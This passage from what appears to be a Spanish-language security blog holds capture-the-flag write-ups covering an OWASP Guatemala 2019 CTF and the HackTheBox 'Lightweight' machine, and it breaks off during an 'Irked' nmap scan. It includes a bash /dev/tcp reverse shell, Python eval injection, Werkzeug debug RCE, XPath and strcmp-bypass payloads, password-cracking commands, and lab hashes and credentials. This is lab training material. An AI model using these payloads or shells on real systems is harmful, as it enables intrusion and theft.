Ponemos a la escucha nuestro puerto en netcat, esperamos y obtenemos nuestra shell inversa como usuario root.\nroot.txt:flag{cr0n_fa1l_bash_scr1pt}\nINFRAESTRUCTURA 3 NMAP Escaneo de puertos tcp con nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13  Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-16 03:17 CDT Nmap scan report for 192.168.1.21 Host is up (0.000077s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.5p1 Ubuntu 10ubuntu0.1 (Ubuntu Linux; protocol 2.0) 5355/tcp open llmnr? 10000/tcp open tcpwrapped MAC Address: 00:0C:29:85:13:94 (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 142.49 seconds   PUERTO 10000 NETCAT - PUERTO 10000 EJECUTANDO comandos - NETCAT 10000 http://intx0x80.blogspot.com/2017/05/python-input-vulnerability_25.html\nAl pasarle una cadena de texto al \u0026lsquo;input\u0026rsquo; este lo evalua, si le pasamos la siguiente linea de codigo \u0026quot;__import__('os').system('id')\u0026quot; lo va ejecutar.\nEncontramos unas credenciales, para poder verlas utilizamos \u0026quot;__import__('os').system('cat credentials.txt')\u0026quot;\ncredentials.txt\n1 2  user: retoinfra2 password: 1337hackme!   Nos logeamos por medio de SSH con las credenciales que encontramos.\nEncontramos el archivo ping que nos mostraba en el navegador:\n1 2 3 4 5 6 7 8  #!/usr/bin/python import time, random num_packets = int(input(\u0026#39; Please enther number of packets: \u0026#39;)) print \u0026#39;\u0026#39; print \u0026#39;PING localhost (127.0.0.1) 56(84) bytes of data\u0026#39; for i in range(num_packets): time.sleep(1) print \u0026#39;64 bytes from localhost (127.0.0.1): icmp_seq={} ttl=64 time=0.0{} ms\u0026#39;.format(i+1, int(random.random() * 100))   Tambien con nuestro archivo flag user y un hint:\nuser.txt: flag{598852e2cd167e254ce4c5e95393c372}\n1 2 3 4 5  cat hint.txt Si estas leyendo esto felicidades, vas muy bien... Para la elevacion de privilegios en esta maquina tiene que realizar port forwarding... debug to rce werkzeug ....   Revisamos los puertos con netstat -ntpl\n1 2 3 4 5 6 7 8 9 10  (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:5000 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:5355 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:10000 0.0.0.0:* LISTEN 3740/socat tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::5355 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN -   Como lo dice el hint vamos a hacer port fordwarding del puerto 5000, lo vamos a traer a nuestra maquina local por medio de SSH.\n1  ssh -L 5656:127.0.0.1:5000 retoinfra2@192.168.1.21   Revisamos localmente con netstat -tnpl y tenemos localmente el puerto 5000 en el puerto 5656 :).\n1 2 3 4 5 6 7  root@sckull:~/owasp/infra# netstat -ntpl Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:111 0.0.0.0:* LISTEN 1/init tcp 0 0 127.0.0.1:5656 0.0.0.0:* LISTEN 4456/ssh tcp6 0 0 :::111 :::* LISTEN 1/init tcp6 0 0 ::1:5656 :::* LISTEN 4456/ssh   Como lo decia el hint, debug to rce werkzeug, encontramos un script que nos ayuda a ejecutar comandos en la maquina cuando esta activado \u0026ldquo;debug=True\u0026rdquo;.\nhttps://github.com/its-arun/Werkzeug-Debug-RCE\nEjecutamos el script y le pasamos la ip local con el puerto que trajimos con SSH tambien le pasamos un comando y eventualmente obtenemos la bandera root.txt\nintra2_root.webp\nroot.txt: flag{8eab1e913f4a669eddbbd45c1484925a}\nSHELL ROOT Agregamos una shell inversa a un archivo sh en la carpeta del usuario que tenemos con bajos privilegios, para ejecutarlo como usuario root.\n1 2 3  retoinfra2@ubuntu:~$ echo \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.1.10/7878 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; shell.sh retoinfra2@ubuntu:~$ pwd /home/retoinfra2   Y por medio del script ejecutamos el archivo que contiene nuestra shell inversa y obtenemos una shell como root.\nroot.txt: flag{8eab1e913f4a669eddbbd45c1484925a}\nuser.txt: flag{598852e2cd167e254ce4c5e95393c372}\n","description":"","id":88,"section":"posts","tags":["challenge","CTF","windows","linux"],"title":"OWASP CTF 2019 Guatemala - Infraestructura","uri":"https://sckull.github.io/posts/owaspinfra/"},{"content":"OWASP CTF es una serie de retos del OWASP Guatemala, aqui encontrarás la solucion para obtener las flags de los diferentes retos presentados por los organizadores.\n Aqui se listan algunas soluciones de los diferentes retos del CTF realizado en el OWASP Guatemala.\nSCOREBOARD TRIVIA Dark Army whiterose\nFriends angela_moss\nE-corp flag{fsociety00.dat}\nFsociety mr robot\nCRYPTO BASE Decodificamos el mensaje en base32.\nComando:\n1  echo MZWGCZ33MJQXGZJTGJPWS427OZSXE6K7MJXXEZLEEF6Q====|base32 -d   flag{base32_is_very_bored!}\nPI PI PI Utilizando google buscamos una de las strings (\u0026ldquo;di-dah-dah\u0026rdquo;) y encontramos que es codigo morse utilizando di y dah que representan los sonidos. Codigo morse.\n1  dah-dah-dah di-dah-dah di-dah di-di-dit di-dah-dah-dit dah-dah-dah-dah-dah di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-di-dit dah-dah-dah-dah-dit   Escribí un pequeño script en python utilizando la tabla de valores descritos en la pagina(Codigo morse).\nCodigo: https://github.com/sckull/ctf-stuff/blob/master/morse_leng.py\nflag: OWASP0123456789\nBRAIN Brainfuck es un lenguaje que se representa por medio de los caracteres \u0026gt;\u0026lt;+-.,[] para obtener la flag se utilizo un decoder online. https://www.dcode.fr/brainfuck-language\n1  ++++++++++[\u0026gt;+\u0026gt;+++\u0026gt;+++++++\u0026gt;++++++++++\u0026lt;\u0026lt;\u0026lt;\u0026lt;-]\u0026gt;\u0026gt;\u0026gt;\u0026gt;++.++++++.-----------.++++++.++++++++++++++++++++.-------------------------.++++++++++++++++.-----------------.\u0026lt;\u0026lt;+++++++++++++++++++.\u0026gt;\u0026gt;+++++++++++++.--------.+++++++++++++++.------------------.++++++++.------------.++++++++++++++++++++++++.----------------------.++++++++++++++++++.--------------------.+++++++++.\u0026lt;\u0026lt;++.\u0026gt;\u0026gt;++++++++++.\u0026lt;\u0026lt;.\u0026gt;\u0026gt;+++++++++++.   flag{bra1nfuck_was_h3r3} \nHTP Nos dan lo que parece una contraseña para poder obtener que tipo de hash es utilizamos hashcat, de igual forma para desencriptar la contraseña la misma herramienta.\n1  Grecie:$apr1$9zQh77LH$cbQwfDnON90qz0mhYg1Yv.   https://hashcat.net/wiki/doku.php?id=example_hashes [1600]\nDecrypted:\n1  $apr1$9zQh77LH$cbQwfDnON90qz0mhYg1Yv.:classof08   flag{classof08}\nTURIN En este reto nos dan un string y una imagen, con el titulo se puede concluir que pertenece a la maquina de turing y la imagen pertenece a la configuracion que debe de tener la maquina para poder obtener el mensaje oculto en el string. Utilizamos la pagina de cryptii.com para obtener nuestra flag.\n1  text:ixqajtrjaq   flag{heilhitler}\nIMPA Para este reto nos dan una pista, al investigar acerca del personaje nos encontramos en la wiki de zelda el lenguaje Sheikah, utilizamos imagenes de google para poder obtener nuestra bandera tambien existe un traductor en dcode.fr/sheikah-language\nWiki de Zelda: https://zelda.gamepedia.com/Sheikah_Language\nReto:\nImpa:\nflag{ZELDALOVEU}\nBATMAN Utilizamos motherreff.in(https://mothereff.in/bacon) para decodificar la flag.\n1  AABABABABAAAAAAAABBA{AAAABAAAAABAABAABABBAAAAAABBAAAAABAAABBBABAAAABBBAAABAABAAAAABAAABAAABAABAAAAAAABAAABBABBA}   FLAG{BATMANCHIPERISEASY}\nKING Un poco de informacion de este reto, la NSA mostro un mensaje parecido a este en un twitt, segun un post (https://news.ycombinator.com/item?id=7711800 ) es un tipo de rompecabezas que vienen en los periodicos. Existen difrentes paginas que pueden decodificar mensajes de este tipo.\n https://www.boxentriq.com/code-breaking/cryptogram http://www.oneacross.com/ https://quipqiup.com/  Para resolver este reto utilizamos una pagina de las listadas anteriormente.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  izu gjweft yifgx izji tjluy wf yuwyu yijgiy frr vkiz jw kdu dgujt igadl j dzur jwe j hkudu fr hpaif. izu maxy izji fvwue izu kdu dgujt igadl yifpu izu hkudu fr hpaif rgft izu hjyigx dzur vzf fnijkwue ki rgft izu rpxkwm upuhzjwi. izu rpxkwm upuhzjwi mfi ki rgft j yatf vguyipug vzf fnijkwue ki kw izu yatf dzjthkfwyzkh fw yjiagw. izux vuwi if yjiagw nudjayu qahkiug vjy rapp fr taijwi nujsdffwy. izu nujsdffwy vugu rgft tjgy vzugu izu nannpx nannpuy, jw jwdkuwi rjwm izji vjy nagkue kw djtupfi pksue. izu nannpx nannpuy djtu njdl jiug izu dpfvwy guyaggudiue zkt kw jw jwdkuwi nagkjp yhupp fr tjmkdjpwuyy. izuw izu dfgwefm rgft suway puje jw jiijdl fr djwfuy fwif izu gayykjwy vzf guyhfweue nx ijlkwm tdefwjpey jvjx rgft dzkwj. ykwdu dzkwj ekew\u0026#39;i zjsu jwxtfgu tdefwjpey izux eudkeue if nax j hkccj zai. izu hkccj zai vjy izuw yifpuw nx j ijplkwm upuhzjwi rgft kwekj. izu upuhzjwi vjy izu maga\u0026#39;y jwe zu pksue ji izu jyzgjt kw pfy jwmupuy. izu upuhzjwi zje j hkm rgkuwe vzf ijamzi tjiz. izu hkm ubhpfeue fwu ejx jwe puri izu vzfpu vfgpe vfweugkwm. ykwdu izu hkm ubhpfeue izu lkwm hkm npjtue izu mkjwiy. ykwdu izu mkjwiy zjiue nukwm npjtue izux pue jw jiijdl fw izu lkwm jwe ykwdu izux vugu fr dfagyu tadz nkmmug izux vugu skdifgkfay. jriug izu mkjwiy iffl dfwigfp fr mguuwpjwe izux yijgiue rkmzikwm izu sklkwmy rgft kdupjwe. izu fhhfwuwiy vugu uouwpx tjidzue yf izux uweue ah euyigfxkwm ujdz fizug jwe izux nudjtu ubikwdi. izuw izu mfgkppjy yifpu izu zfwej igjkp 70\u0026#39;y rgft ifwx yfhgjwf izu puje mjwmyiug rgft kijpx. ifwx yfhgjwf jdiajppx mfi izu zfwej\u0026#39;y rgft kwekj jwxzfv njdl if izu mfgkppjy. izu mfgkppjy yijgiue djaykwm j galay kw izu nkm jhhpu, jdiajppx j nkm jhhpu, vzugu izux gjw fsug nkppx qfu jwe ukpuuw. ykwdu izu rffinjpp hpjxugy vugu dzjykwm izut izu mfgkppjy zfhhue kwif izu mkjwi hujdz vkiz qjtuy vzf vjy uydjhkwm zky uskp hjguwiy. izu yifgx uwey izugu k\u0026#39;t yfggx if yjx nai fz vupp zux, zux, zux. izu rpjm ky \u0026#34;izux jpp pksue zjhhkpx uoug jriug\u0026#34;.   1  the random story that makes no sense starts off with an ice cream truck a chef and a piece of pluto the guys that owned the ice cream truck stole the piece of pluto from the pastry chef who obtained it from the flying elephant the flying elephant got it from a sumo wrestler who obtained it in the sumo championship on saturn they went to saturn because jupiter was full of mutant beavcoons the beavcoons were from mars where the bubbly bubbles an ancient fang that was buried in camelot lived the bubbly bubbles came back ater the clowns resurrected him in an ancient burial spell of magicalness then the corndog from venus lead an attack of canoes onto the russians who responded by taking mcdonalds away from china since china didn t have anymore mcdonalds they decided to buy a pizza hut the pizza hut was then stolen by a talking elephant from india the elephant was the guru s and he lived at the ashram in los angeles the elephant had a pig friend who taught math the pig exploded one day and left the whole world wondering since the pig exploded the king pig blamed the giants since the giants hated being blamed they led an attack on the king and since they were of course much bigger they were victorious after the giants took control of greenland they started fighting the vikings from iceland the opponents were eqenly matched so they ended up destroying each other and they became extinct then the gorillas stole the honda trail s from tony soprano the lead gangster from italy tony soprano actually got the honda s from india anyhow back to the gorillas the gorillas started causing a rukus in the big apple actually a big apple where they ran over billy joe and eileen since the football players were chasing them the gorillas hopped into the giant peach with james who was escaping his evil parents the story ends there i m sorry to say but oh well hey hey hey the flag is they all lived happily eqer after   Se cambio la q por una v.\nthey all lived happily eqer after\nflag: they all lived happily ever after\nSAVE ME! Archivos .fun, Investigamos sobre la extension de estos archivos y encontramos que es un virus de tipo ransomware, el cual encripta los archivos con esa extension.\n https://www.pcrisk.es/guias-de-desinfeccion/8248-fun-ransomware  Para obtener los archivos encriptados en el archivo del reto utilizamos jigsaw.exe el cual nos permite desencriptar este tipo de archivos.\nflag{Jigsaw_ransomware_in_house}\nESTEGANOGRAFIA DATA Utilizamos exif para ver los metadatos de la imagen y encontramos la flag.\nflag{metadata_in_the_dark}\nMATRIX Utilizamos inlite para decodificar la imagen https://online-barcode-reader.inliteresearch.com/\nflag{matr1x_qr}\nMONDRIAN Una imagen que tiene un mensaje oculto, este lenguaje se llama piet y se encuentra en imagenes que parecen estilo abstractas. (http://www.dangermouse.net/esoteric/piet.html)\nDecodificamos la imagen aqui:\nhttps://www.bertnase.de/npiet/npiet-execute.php\nflag{p1et_programm1ng!}\nHIDE Utilizamos binwalk para extraer lo que esta en el interior de la imagen, al extraer el archivo descomprimimos de nuevo y obtenemos un archivo txt, este nos indica que esta en diferentes bases, decodificamos el mensaje en base64 y base32 para obtener la flag.\ntryhackme{b1nw4lk_0r_f0r3mo5t}\nREVERSING CRACKME1 Para hacer una compilacion inversa al archivo crackme.pyc existe una herramienta llamada uncompyle2 para obtener el codigo fuente equivalente al archivo.\nComando:\n1  uncompyle2 crackme.pyc -o crackme.py   Codigo fuente (Ordenado manualmente para obtener la flag):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  import random lr = \u0026#39;2\u0026#39; db = \u0026#39;w\u0026#39; ef = \u0026#39;s\u0026#39; ty = \u0026#39;3\u0026#39; gh = \u0026#39;!\u0026#39; aa = \u0026#39;O\u0026#39; rr = \u0026#39;p\u0026#39; nn = \u0026#39;a\u0026#39; chains = [116,104,105,115,32,105,115,32,97,32,116,114,111,108,108] chars = [] lock_pick = random.randint(0, 1000) lock = lock_pick * 2 password = [105,116,115,32,110,111,116,32,116,104,97,116,32,101,97,115,121] lock = lock + 10 lock = lock / 2 auth = [107,101,101,112,32,116,114,121,105,110,103] lock = lock - lock_pick print lock slither = aa + db + nn + ef + rr + gh + lr + ty print slither keys = [112,97,115,115,119,111,114,100,33,33] print \u0026#39;Authentication required\u0026#39; print \u0026#39;\u0026#39; user_input = raw_input(\u0026#39;Enter your username\\n\u0026#39;) if user_input == slither: print \u0026#39;yeeeea! correct user!\u0026#39; else: print \u0026#39;Wrong username try harder\u0026#39; exit()   flag: Owasp!23\nCRACKME2 Utilizamos rabin2 para obtener las strings dentro del archivo bin y obtuvimos el usuario correcto.\nflag: hax0r\nMISC SHADOW Un archivo que contiene la contraseña del usuario root, usamos john the ripper para obtener la ocnttraseña.\nflag{toor} \nREGISTER La bandera de este reto pertenece al reto de registrarse en la plataforma. http://ctf.develsecurity.com/0x1 En hora buena por tu registro , tu premio es la flag para el reto register en la categoria misc.\nflag{00010!}\nPDF Utilizamos pdfcrack y el diccionario Ashley Madison. Diccionario: https://raw.githubusercontent.com/dustyfresh/dictionaries/master/AshleyMadisonCracked.txt\nComando:\n1  pdfcrack -f flag-protected.pdf -w AshleyMadisonCracked.txt   Contraseña: zerkalo1974\nflag{pdfcrack_was_here!}\nKEEP Utilizamos keepass2john para obtener el hash y hashcat para obtener la contraseña del archivo.\n1  $keepass$*2*60000*0*cc74b5166afe1df0757d8d208078d4d2f9fe3e331ff730b9cb5cfb94064eea50*b6d616ca2c797d4a942df786640acc92749f8005fc2b31114c0ba5b2aced9a5e*459b7fe3b1200a8b48ad9663925465c4*72cdc691f0f93f79476c83f8b1f1db44ab23ca6217048cd67bbde5e8ff76b402*1acb7f5538987791204995bc3c1ba96a254b3be85051946058b07ee6ef1b4d45   Comando hashcat:\n1  hashcat64.bin -m 13400 keepas.txt ../rockyou.txt -o keepas_owasp.txt   Contraseña: zaq1zaq1\nUtilizamos keepassx para abrir el archivo Database.kdbx.\nVemos un mensaje de flag pero no aparece nuestra flag como cadena normal, el texto que aparece en el campo de password parece ser base64 invertida, invertimos el mensaje y decodificamos.\nComando:\n1  echo =0HZy92dzNXYw9VZyV3YlNnbx8Fa0FzdfNXYwVWZr91ZuFzahVmcit3ZhxmZ |rev|base64 -d   flag{break1ng_keepas_w1th_1nsecure_password}\nZERO Para este reto escribí un script en python y con el codigo ascii que aparece en el archivo leeme.txt generamos un codigo de barras para luego obtener la bandera en https://online-barcode-reader.inliteresearch.com/.\nCodigo: https://github.com/sckull/ctf-stuff/blob/master/stego_zero.py\nflag{qr_to_ascii_art}\nPORT Para este reto hicimos un escaneo de puertos con nmap a la plataforma del ctf, encontramos el puerto 1337 al visitarlo nos muestra un error con nuestra flag.\nComando:\n1  nmap -p1-65535 ctf.develsecurity.com   1 2 3 4 5 6 7 8 9 10  PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)25/tcp filtered smtp80/tcp open http81/tcp open http Apache httpd 2.4.18 ((Ubuntu))82/tcp open http Apache httpd 2.4.18 ((Ubuntu))83/tcp open http Apache httpd 2.4.18 ((Ubuntu))84/tcp open http Apache httpd 2.4.18 ((Ubuntu))111/tcp open rpcbind 2-4 (RPC #100000)1337/tcp open waste?  Mensaje al visitar la pagina.\n1 2 3 4 5 6 7 8 9  xmp\u0026amp;gt;perl: warning: Setting locale failed.perl: warning: Please check that your locale settings: LANGUAGE = (unset), LC_ALL = (unset), LANG = \u0026#34;es_GT.UTF-8\u0026#34; are supported and installed on your system.perl: warning: Falling back to the standard locale (\u0026#34;C\u0026#34;).Unescaped left brace in regex is deprecated, passed through in regex; marked by \u0026lt;!-- HERE in m/%{ --\u0026gt; HERE (.*?)}/ at /usr/bin/print line 528.Error: no such file \u0026#34;flag{secret_in_the_port_is_null}\u0026#34;  flag{secret_in_the_port_is_null}\nMOBILE MOBILE Utilizamos apktool para poder decompilar el archivo Mobile1.apk y ver el codigo que tiene dentro. Tambien podemos utilizar http://www.javadecompilers.com/ para el mismo fin.\nLa flag se encuentra en HelloWorldActivity.\nCodigo generado por javadecompilers.\n1 2 3 4 5 6 7 8 9 10 11  package com.example.helloworld; import android.os.Bundle; import com.phonegap.DroidGap; public class HelloWorldActivity extends DroidGap { public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); super.loadUrl(\u0026#34;flag{de0fuscate_code}\u0026#34;); } }   flag{de0fuscate_code}\nWEB HIDE Para este reto buscamos directorios comunes, tambien buscamos en el codigo fuente de las paginas. http://ctf.develsecurity.com:81/admin/flag.txt\nflag{http_directory_indexing}\nDEFAULT De igual forma, algunos directorios comunes. http://ctf.develsecurity.com:82/install/\nflag{default_files_installation_fake_cms}\nINJECT XPATH INJECTION Probamos con alguno de los payloads aqui descritos y obtuvimos la flag.\nPayloads: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection\nPayload: x' or 1=1 or 'x'='y\nflag{XPATH_1NJ3CT10N}\nBYPASS Utilizamos el siguiente payload en metodo POST para obtener la bandera.\nPayload: ?password[]=\u0026quot;\u0026quot;\nhttp://ctf.develsecurity.com:84/login.php?password[]=%22%22\nflag{bypass_strcmp_function}\nFORENSICS Para este reto revisamos todas las conexiones que se hicieron durante el volcado de memoria de este archivo, no enocontramos alguna ip que se ejecutara bajo un proceso en especifico. Asumiendo que al realizar este volcado de memoria se identifico a algun tipo de intruso en la computadora revisamos el \u0026ldquo;historial\u0026rdquo; de comandos y encontramos que antes de realizar el volcado de memoria el usuario hizo ping a una direccion que no aparece por ningun lado (sockets,socketscan,connscan,etc).\nflag: 192.168.21.161\nNSA.ZIP[raw] Para este reto utilizamos volatility y algunos de sus comandos para obtener las flags.\nProfile: Win7SP1x64\nHASH NTLM flag:31d6cfe0d16ae931b73c59d7e0c089c0\nUSER flag: victim\nPID Pid del proceso wmpnetwk.exe.\nflag: 2464\nSIDs flag: S-1-5-21-3480093824-3207195214-1800084707-1001\nCOMPUTER NAME flag:VICTIM-PC\nOSINT IP NSA Utilizamos algunas paginas para obtener informacion del historial de IPs de nsa.gov.\nhttps://myip.ms/\nNuestra flag: flag{23.196.119.211}\n1  23.196.119.211 United States Akamai Technologies, Inc. 2016-08-25  SEXY Utilizamos Google Images para hacer una busqueda de la imagen e informacion.\nflag: tiffanytrump\nSTUX flag: 1096100\nNetworking NETWORKING1 Utilizamos Wireshark y un filtro para el puerto 21 FTP.\n tcp.port==21 ftp  flag{sn1ff1ng_ftp_cr3dent1als}\nNETWORKING2  http.request.method == \u0026ldquo;POST\u0026rdquo;  flag{http_1nsecure_commun1cat1on}\n","description":"","id":89,"section":"posts","tags":["challenge","CTF"],"title":"OWASP CTF 2019 Guatemala - Writeup","uri":"https://sckull.github.io/posts/owasp2019/"},{"content":"Lightweight es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre Lightweight     OS Linux   Puntos 30   Dificultad Medium   IP 10.10.10.119   Maker 0xEA31    NMAP En el resultado del escaneo de puertos tcp con nmap nos muestra tres puertos abiertos ssh, http y ldap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  Nmap 7.70 scan initiated Thu Jan 10 15:20:40 2019 as: nmap -sC -sV -o tcp 10.10.10.119 Nmap scan report for 10.10.10.119 Host is up (0.20s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 (RSA) | 256 88:58:a1:cf:38💿2e:15:1d:2c:7f:72:06:a3:57:67 (ECDSA) |_ 256 31:6c:c1:eb:3b:28:0f:ad:d5:79:72:8f:f5:b5:49:db (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16) 389/tcp open ldap OpenLDAP 2.2.X - 2.3.X | ssl-cert: Subject: commonName=lightweight.htb | Subject Alternative Name: DNS:lightweight.htb, DNS:localhost, DNS:localhost.localdomain | Not valid before: 2018-06-09T13:32:51 |_Not valid after: 2019-06-09T13:32:51 |_ssl-date: TLS randomness does not represent time Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done at Thu Jan 10 15:21:22 2019 -- 1 IP address (1 host up) scanned in 41.92 seconds   NMAP SCRIPT: LDAPSEARCH Utilizamos el script de nmap ldapsearch para poder obtener informacion en el puerto de ldap abierto, obtenemos informacion relacionada con usuarios, correo electronico, contraseña, etc.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79  Nmap 7.70 scan initiated Thu Jan 10 15:40:00 2019 as: nmap -sC -sV -p389 --script=ldap-search -o ldap-nmap 10.10.10.119 Nmap scan report for 10.10.10.119 Host is up (0.18s latency). PORT STATE SERVICE VERSION 389/tcp open ldap OpenLDAP 2.2.X - 2.3.X | ldap-search: | Context: dc=lightweight,dc=htb | dn: dc=lightweight,dc=htb | objectClass: top | objectClass: dcObject | objectClass: organization | o: lightweight htb | dc: lightweight | dn: cn=Manager,dc=lightweight,dc=htb | objectClass: organizationalRole | cn: Manager | description: Directory Manager | dn: ou=People,dc=lightweight,dc=htb | objectClass: organizationalUnit | ou: People | dn: ou=Group,dc=lightweight,dc=htb | objectClass: organizationalUnit | ou: Group | dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb | uid: ldapuser1 | cn: ldapuser1 | sn: ldapuser1 | mail: ldapuser1@lightweight.htb | objectClass: person | objectClass: organizationalPerson | objectClass: inetOrgPerson | objectClass: posixAccount | objectClass: top | objectClass: shadowAccount | userPassword: {crypt}$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/ | shadowLastChange: 17691 | shadowMin: 0 | shadowMax: 99999 | shadowWarning: 7 | loginShell: /bin/bash | uidNumber: 1000 | gidNumber: 1000 | homeDirectory: /home/ldapuser1 | dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb | uid: ldapuser2 | cn: ldapuser2 | sn: ldapuser2 | mail: ldapuser2@lightweight.htb | objectClass: person | objectClass: organizationalPerson | objectClass: inetOrgPerson | objectClass: posixAccount | objectClass: top | objectClass: shadowAccount | userPassword: {crypt}$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1 | shadowLastChange: 17691 | shadowMin: 0 | shadowMax: 99999 | shadowWarning: 7 | loginShell: /bin/bash | uidNumber: 1001 | gidNumber: 1001 | homeDirectory: /home/ldapuser2 | dn: cn=ldapuser1,ou=Group,dc=lightweight,dc=htb | objectClass: posixGroup | objectClass: top | cn: ldapuser1 | userPassword: {crypt}x | gidNumber: 1000 | dn: cn=ldapuser2,ou=Group,dc=lightweight,dc=htb | objectClass: posixGroup | objectClass: top | cn: ldapuser2 | userPassword: {crypt}x |_ gidNumber: 1001 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done at Thu Jan 10 15:40:14 2019 -- 1 IP address (1 host up) scanned in 14.17 seconds   HASHCAT Ya que encontramos contraseñas encriptadas podriamos utilizar hashcat para realizar un ataque a contraseña pero este metodo podria tardar mucho tiempo tomando en cuenta el tamaño de nuestro diccionario, por lo que vamos a seguir buscando por otros lados acceso.\n1  hashcat -m 1800 -o pass.txt ldap-password.txt /usr/share/wordlist/rockyou.txt --force ldap-password.txt   1 2  $6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/ $6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1   HTTP Ya que esta maquina tiene el puerto http abierto procedemos a visitar la pagina, y nos muestra un mensaje This site is protected by agains bruteforging..\nAl visitar las paginas disponibles encontramos\nAl visitar la pagina de user nos muestra un mensaje This server lets you get in with ssh. Your IP (10.10.12.63) is automatically added as userid and password within a minute of your first http page request... , la pagina nos genera un usuario (IP) y contraseña (IP) con los cuales podemos ingresar a la maquina por el puerto 22 de ssh.\nSSH Utilizamos las credenciales que nos proporciona la pagina y obtenemos una shell atravez de ssh con privilegios de bajo nivel.\nYa que no encontramos software con privilegios (SUID, GUID) que nos pueda ayudar a escalar privilegios procedemos a buscar software con ciertas capacidades (getcap/setcap).\nEncontramos tcpdump que es utilizado para analizar el trafico de una red, y tiene CAP_NET_ADMIN y CAP_NET_RAW, para realizar operaciones relacionadas a la red.\nTCPDUMP Utilizamos tcpdump para ver que cosas interesantes nos podemos capturar.\nAl realizar un analisis al archivo encontramos algo interesante, puesto que la maquina es un servidor http y ldap al mismo tiempo de alguna forma al realizar el listado de IPs baneadas el servidor hace una verificacion mediante ldap para poder actualizar dicha pagina y en los paquetes capturados encontramos al usuario ldapuser2 y su contraseña.\nUtilizamos las credenciales encontradas y obtenemos una shell como ldapuser2 y el user.txt flag.\nEn nuestra carpeta como usuario ldapuser2 encontramos un archivo backup.7z al intentar descomprimirlo nos pide una contraseña. Utilizamos fuerza bruta para poder encontrar y descomprimir el contenido del archivo, para ello 7z2hashcat.pl nos fue de gran ayuda.\nAl descomprimir el contenido de backup.7z encontramos lo siguiente.\nAnalizamos cada uno de los archivos encontramos al usuario ldapuser1 y su contraseña en status.php.\nUtilizamos las credenciales.\nOPENSSL Al realizar una busqueda de algun software para escalar privilegios encontramos que openssl tiene las capacidades habilitadas y permitidas.\nUtilizamos openssl para hacer bypass (openssl), leer y escribir archivos. En este caso vamos a utilizar openssl para leer el root.txt flag que se encuentra en /root/root.txt.\n","description":"","id":90,"section":"posts","tags":["linux"],"title":"Hack The Box - Lightweight","uri":"https://sckull.github.io/posts/lightweight/"},{"content":"Irked es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n NMAP Escaneo de puertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48  Starting Nmap 7.70 ( https://nmap.org ) Nmap scan report for 10.10.10.117 Host is up (0.081s latency). Not shown: 65205 closed ports, 323 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) | ssh-hostkey: | 1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA) | 2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA) | 256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b 